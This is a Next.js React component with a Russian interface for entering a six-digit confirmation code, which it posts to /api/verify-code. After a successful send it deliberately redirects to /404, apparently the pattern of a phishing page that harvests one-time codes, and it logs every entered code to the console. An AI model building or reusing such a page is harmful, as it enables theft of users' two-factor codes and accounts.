"use client";

import { useState, useRef, useEffect } from "react";
import { useRouter } from "next/navigation";
import Logo from "@/components/Logo/Logo";

/**
 * Компонент для ввода 6-значного кода
 */
export default function CodeInput() {
  const router = useRouter();
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  /**
   * Обновление кода и переход к следующему полю
   */
  const handleChange = (index: number, value: string) => {
    // Только цифры
    if (value && !/^\d$/.test(value)) {
      return;
    }

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);
    setError("");

    // Переход к следующему полю
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    console.log("[CODE] Введенный код:", newCode.join(""));
  };

  /**
   * Обработка клавиш (Backspace, стрелки)
   */
  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>
  ) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === "ArrowRight" && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  /**
   * Обработка вставки кода (paste)
   */
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").slice(0, 6);
    const digits = pastedData.split("").filter((char) => /^\d$/.test(char));

    if (digits.length > 0) {
      const newCode = [...code];
      digits.forEach((digit, i) => {
        if (i < 6) {
          newCode[i] = digit;
        }
      });
      setCode(newCode);
      const nextIndex = Math.min(digits.length, 5);
      inputRefs.current[nextIndex]?.focus();
    }
  };

  /**
   * Отправка кода
   */
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    const codeString = code.join("");

    if (codeString.length !== 6) {
      setError("Пожалуйста, введите все 6 цифр");
      setIsLoading(false);
      return;
    }

    console.log("[CODE] Отправка кода:", codeString);

    try {
      const response = await fetch("/api/verify-code", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ code: codeString }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Ошибка при отправке кода");
      }

      console.log("[CODE] Код успешно отправлен, перенаправление на 404");
      router.push("/404");
    } catch (err) {
      console.error("[CODE] Ошибка отправки кода:", err);
      setError(err instanceof Error ? err.message : "Произошла ошибка");
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4 py-8">
      <div className="w-full max-w-sm">
        {/* Карточка формы */}
        <div className="bg-white rounded-lg border border-gray-200 shadow-sm p-8">
          {/* Логотип */}
          <div className="mb-6">
            <Logo />
          </div>

          {/* Разделительная линия */}
          <div className="border-t border-gray-200 mb-6"></div>

          {/* Заголовок */}
          <h1 className="text-2xl font-bold text-gray-900 text-center mb-2 font-condensed uppercase">
            ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ
          </h1>
          <p className="text-sm text-gray-600 text-center mb-6">
            Пожалуйста, введите 6-значный код
          </p>

          {/* Форма */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Сообщение об ошибке */}
            {error && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded text-sm">
                {error}
              </div>
            )}

            {/* Поля для ввода кода */}
            <div className="flex justify-center gap-3">
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  className="w-12 h-14 text-center text-2xl font-semibold border-2 border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              ))}
            </div>

            {/* Кнопка подтверждения */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-bold py-3 px-4 rounded-md transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed font-condensed uppercase"
            >
              {isLoading ? "Отправка..." : "ПОДТВЕРДИТЬ"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

